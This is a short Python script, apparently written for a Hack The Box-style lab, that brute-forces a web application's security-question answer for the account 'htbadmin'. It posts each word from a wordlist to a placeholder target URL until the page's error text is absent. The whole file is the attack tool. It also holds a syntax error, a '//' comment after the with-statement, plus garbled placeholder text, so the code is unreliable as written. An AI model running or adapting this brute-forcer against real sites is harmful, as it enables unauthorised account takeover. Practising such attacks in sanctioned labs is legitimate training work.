import requests
url = "your target url"
headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36"}
invalid = "when wrong answer's totile"
question = "this your want to answer question"

def main():
    with open('wordlist.txt') as fh://this your directory
        for line in fh:
            answer = line.strip()
            response = requests.post(url, headers=headers, data={"answer": answer, "question": question, "userid": "htbadmin", "submit": "answer"})
            if invalid not in response.text:
                print(f"[+] Valid answer found: {answer}")
                break

if __name__ == "__main__":
    main()
